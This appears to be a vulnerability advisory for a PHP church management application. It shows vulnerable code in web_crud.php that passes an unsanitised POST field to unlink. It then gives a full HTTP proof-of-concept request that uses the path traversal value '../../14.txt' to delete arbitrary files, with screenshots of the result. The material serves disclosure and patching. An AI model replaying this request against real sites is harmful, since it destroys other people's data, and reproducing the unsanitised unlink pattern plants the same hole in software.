### Vulnerability file address

In line 392 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_gallery_img']);`,` $_POST['old_gallery_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['galleryphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["galleryphoto"]["name"]);

            if (move_uploaded_file($_FILES["galleryphoto"]["tmp_name"], $filepath)) {
                $img3 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_gallery_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 381

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_gallery_img"

../../14.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="galleryphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `14.txt` file in the `church/` directory

![image-20250505160623982](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051606029.png)

Then we execute the above poc to attack

![image-20250505160835609](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051608642.png)

Files are deleted after the attack is successful

![image-20250505160853432](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051608476.png)